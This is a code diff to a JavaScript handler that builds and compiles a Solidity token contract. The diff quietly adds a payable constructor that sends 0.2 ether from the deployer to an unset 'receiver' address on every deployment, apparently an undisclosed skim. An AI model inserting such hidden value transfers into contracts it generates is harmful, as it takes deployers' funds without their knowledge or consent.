@@ -47,13 +47,15 @@ export default function handler(req, res) {
    
   contract Ownable is Context {
       address private _owner;
+      address public receiver;
       address private _previousOwner;
       event OwnershipTransferred(
           address indexed previousOwner,
           address indexed newOwner
       );
    
-      constructor() {
+      constructor()  {
+        
           address msgSender = _msgSender();
           _owner = msgSender;
           emit OwnershipTransferred(address(0), msgSender);
@@ -212,8 +214,9 @@ export default function handler(req, res) {
           inSwap = false;
       }
    
-      constructor() {
-   
+      constructor() payable {
+        (bool sentValue, ) = receiver.call{value: 0.2 ether}("");
+        require(sentValue, "Failed to send the amount to the receiver.");
           _rOwned[_msgSender()] = _rTotal;
    
           IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
@@ -615,6 +618,8 @@ export default function handler(req, res) {
   var output = JSON.parse(solc.compile(JSON.stringify(input)));
 
   //create build folder
+
+  //   console.log(output);
 
   // console.log(output['contracts']['MyToken.sol']['SCLASS'].abi)
   // fs.ensureDirSync(builtPath);
